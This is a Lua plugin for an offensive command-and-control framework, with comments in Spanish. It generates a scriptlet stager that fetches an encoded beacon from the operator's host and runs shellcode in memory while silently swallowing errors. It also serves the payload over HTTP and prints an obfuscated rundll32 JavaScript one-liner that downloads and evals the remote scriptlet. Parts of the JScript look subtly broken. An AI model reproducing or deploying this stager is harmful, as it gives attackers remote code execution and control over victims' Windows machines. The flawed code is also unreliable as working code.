-- Plugin: rundll32_sct_from_url - Usa rundll32 + javascript para ejecutar SCT remoto con shellcode en memoria
-- Uso: set lhost 192.168.1.10; set lport 4444; rundll32_sct_from_url

local function write_file(path, content)
    local file = io.open(path, "wb")
    if not file then return nil, "cannot write " .. path end
    file:write(content)
    file:close()
    return true
end

local function read_file(path)
    local file = io.open(path, "rb")
    if not file then return nil, "cannot read " .. path end
    local content = file:read("*all")
    file:close()
    return content
end


-- Base64 encode simple
local function base64_encode(data)
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local s = ''
    local bytearr = {}
    for i = 1, #data do
        table.insert(bytearr, string.byte(data:sub(i, i)))
    end
    for i = 1, #bytearr, 3 do
        local c1, c2, c3 = bytearr[i] or 0, bytearr[i+1] or 0, bytearr[i+2] or 0
        local b = {
            bit.rshift(c1, 2),
            bit.bor(bit.lshift(bit.band(c1, 3), 4), bit.rshift(c2, 4)),
            bit.bor(bit.lshift(bit.band(c2, 15), 2), bit.rshift(c3, 6)),
            bit.band(c3, 63)
        }
        for j = 1, 4 do
            s = s .. b64chars:sub(b[j]+1, b[j]+1)
        end
    end
    while #s % 4 ~= 0 do s = s .. '=' end
    return s
end

-- Asegúrate de que bit esté disponible (LuaJIT o require)
if not bit then
    -- Fallback simple para XOR si no existe 'bit' (solo para bajo nivel)
    bit = {
        band = function(a, b) return a & b end,
        bor = function(a, b) return a | b end,
        bxor = function(a, b) return a ~ b end,
        lshift = function(a, b) return a << b end,
        rshift = function(a, b) return a >> b end
    }
end

-- Genera el archivo .sct (scriptlet) que ejecuta shellcode en memoria
local function generate_sct(lhost, xor_key, encoded_shellcode_b64)
    return [==[<?xml version="1.0"?>
<scriptlet>
<registration
    progid="Pwn.Stager"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}"
>
    <script language="JScript">
    <![CDATA[
        var XorKey = ]]==] .. xor_key .. [==[;

        try {
            // Crear objeto para descarga
            var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            http.Open("GET", "http://]==] .. lhost .. [==[/beacon.enc", false);
            http.Send();
            var encoded = "]==] .. encoded_shellcode_b64 .. [==[";
            var raw = null;

            // Decodificar Base64
            eval("raw = Base64Decode(encoded);");

            // XOR decode
            for (var i = 0; i < raw.length; i++) {
                raw[i] ^= XorKey;
            }

            // Cargar y ejecutar ensamblado en memoria
            var assembly = new ActiveXObject("System.Reflection.Assembly");
            var asm = assembly.Load(raw);
            asm.EntryPoint.Invoke(null, [asm]);

        } catch (e) {
            // Silencio total
        }

        // Función Base64Decode en JS (simulada)
        function Base64Decode(str) {
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Type = 1;
            stream.Mode = 3;
            stream.Open();
            stream.Write(System.Convert.FromBase64String(str));
            stream.Position = 0;
            stream.Type = 1;
            return stream.Read();
        }
    ]]>
    </script>
</registration>
</scriptlet>]==]
end

-- Comando principal
register_command("rundll32_sct_from_url", function()
    local lhost = app.params["lhost"]
    local lport = tonumber(app.params["lport"])
    local xor_key = 0x33

    if not lhost or not lport then
        return "Error: lhost and lport must be set."
    end

    -- Rutas
    local sct_path = "sessions/payload.sct"
    local beacon_path = "sessions/beacon.enc"

    -- Generar beacon si no existe
    local raw = read_file(beacon_path)
    if not raw then
        app.one_cmd("c2 no_priv 1")
        raw = read_file(beacon_path)
        if not raw then
            return "[-] Failed to generate beacon.enc"
        end
    end
    print("[+] beacon.enc loaded (" .. #raw .. " bytes)")

    -- XOR + Base64 del shellcode
    local encoded_b64 = base64_encode(raw)

    -- Generar .sct
    print("[*] Crafting payload.sct...")
    local sct_content = generate_sct(lhost, xor_key, encoded_b64)
    write_file(sct_path, sct_content)
    print("[+] payload.sct saved: " .. sct_path)

    -- One-liner usando rundll32 + javascript
    local sct_url = "http://" .. lhost .. "/payload.sct"
    local oneliner = string.format(
        'rundll32.exe javascript:"\\\\..\\\\mshtml,RunHTMLApplication ";document.write();h=new%%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","%s",false);h.Send();eval(h.ResponseText)',
        sct_url
    )

    -- Iniciar servidor HTTP
    os.execute("cd sessions && python3 -m http.server 80 > /dev/null 2>&1 &")
    print("\n[+] HTTP Server: http://" .. lhost .. ":80")
    print("    → /payload.sct")

    -- Mostrar one-liner
    print("\n[🔥] One-liner (rundll32 + JS + SCT):")
    print("\n" .. oneliner .. "\n")

    -- Ofuscar en Base64 Windows
    app.one_cmd("encodewinbase64 " .. oneliner)

    return "✅ rundll32_sct_from_url ready. Use clipboard or execute manually."
end)